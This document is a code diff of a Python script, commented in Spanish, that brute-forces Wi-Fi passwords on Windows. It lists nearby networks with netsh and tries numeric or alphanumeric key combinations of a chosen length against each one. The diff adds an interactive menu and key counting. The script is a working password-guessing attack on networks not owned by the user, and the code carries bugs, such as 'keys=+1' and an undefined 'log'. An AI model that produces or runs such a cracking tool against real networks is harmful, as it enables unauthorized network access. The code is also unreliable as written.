@@ -1,5 +1,5 @@
 from tqdm import tqdm
-import os, re, subprocess, requests, pandas as pd, numpy as np
+import os, re, subprocess, pandas as pd, numpy as np
 
 def Find_SSID(dim):
     # ver redes detectables y caracteristicas
@@ -112,10 +112,12 @@ def numeric(redes,last,dim):
                     redes.drop(k,inplace=True)
                     redes.reset_index(drop=True,inplace=True)
                     print("\nSe ha conseguido una key c:\n")
-                    key=+1
+                    keys=+1
 
     for n in range(redes.Redes):
         subprocess.run(["netsh","wlan","delete","profile name="+redes.Redes[n]])
+    
+    return keys
 
 def alfanum(redes,dim,ntries):
     import string
@@ -132,6 +134,7 @@ def alfanum(redes,dim,ntries):
         pws.append("0")    
     inc=True
     while inc==True and len(redes.Redes)>0:
+        keys=0
         for i in range(len(caracts)):
             pws[-1]=caracts[i]
             pw="".join(pws)
@@ -144,22 +147,39 @@ def alfanum(redes,dim,ntries):
                 if signal==True:
                     redes.drop(k,inplace=True)
                     redes.reset_index(drop=True,inplace=True)
+                    keys=+1
         pws,inc=incress(pws,caracts)
     for n in range(len(redes.Redes)):
         subprocess.run(["netsh","wlan","delete","profile name="+redes.Redes[n]])
-    return print("test de tipo: "+t+" y de cadenas de: "+str(dim)+" fue completado")
+    return f"test de tipo: {t} y de cadenas de: {str(dim)} fue completado",keys
 
-## realizar primeros test y comenzar a decifrar claves ##
+## primeros test funcionaron pero la iteracion tiene mucho coste computacional ##
+while True:
+    try:
+        dim = int(input('Dimension de la clave a probar'))
+    except:
+        print('no es un valor numerico')
 
-# dimension de la clave a probar
-dim=8
-# Ver redes e iniciar los archivos xml
-redes=Find_SSID(dim)
-last=int("1"+"0"*dim)
-# numericas
-keys=numeric(redes,last,dim)
-print("keys encontradas:"+keys)
-# alfanumericas
-#alfanum(redes,dim,0)
-# alfanumericas con caracteres especiales
-#alfanum(redes,dimm,1)
+    # dimension de la clave a probar
+    type = input('tipo de cadena (num/alfaNum/alfaEspecial)')
+    # Ver redes e iniciar los archivos xml
+    redes=Find_SSID(dim)
+    last=int("1"+"0"*dim)
+
+    # numericas
+    if type == 'num':
+        keys=numeric(redes,last,dim)
+        break
+    # alfanumericas
+    elif type == 'alfaNum':
+        log,keys = alfanum(redes,dim,0)
+        break
+    # alfanumericas con caracteres especiales
+    elif type == 'alfaEspecial':
+        log,keys=alfanum(redes,dim,1)
+        break
+    else:
+        print('No has introducido un tipo valido')
+
+print(log)
+print(f"keys encontradas: {keys}")
